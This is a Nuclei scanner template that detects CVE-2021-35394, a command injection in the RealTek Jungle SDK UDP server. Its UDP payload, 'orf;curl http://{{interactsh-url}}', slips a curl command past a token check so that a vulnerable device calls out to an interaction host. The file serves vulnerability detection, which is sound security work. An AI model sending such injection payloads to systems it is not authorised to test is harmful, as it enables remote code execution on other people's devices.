id: CVE-2021-35394

info:
  name: RealTek Jungle SDK -  Arbitrary Command Injection
  author: king-alexander
  severity: critical
  description: There is a command injection vulnerability via the UDPServer protocol
  impact: |
    Successful exploitation of this vulnerabilty could lead to remote code execution and compromise of the affected system.
  remediation: |
    Apply the latest security patches or updates provided by RealTek to fix the vulnerability.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2021-35394
    - https://onekey.com/blog/advisory-multiple-issues-realtek-sdk-iot-supply-chain/
    - https://blogs.juniper.net/en-us/threat-research/realtek-cve-2021-35394-exploited-in-the-wild
  tags: cve,cve2021,realtek,rce,kev

udp:
  inputs:
    # We bypass the "orf" command, which was supposed to act as a secret token
    - data: "orf;curl http://{{interactsh-url}}"
  host:
    - "{{hostname}}"
  port: 9034

  matchers-condition: and
  matchers:
    - type: word
      part: interactsh_protocol
      words:
        - "http"

    - type: word
      part: interactsh_request
      words:
        - "User-Agent: curl"
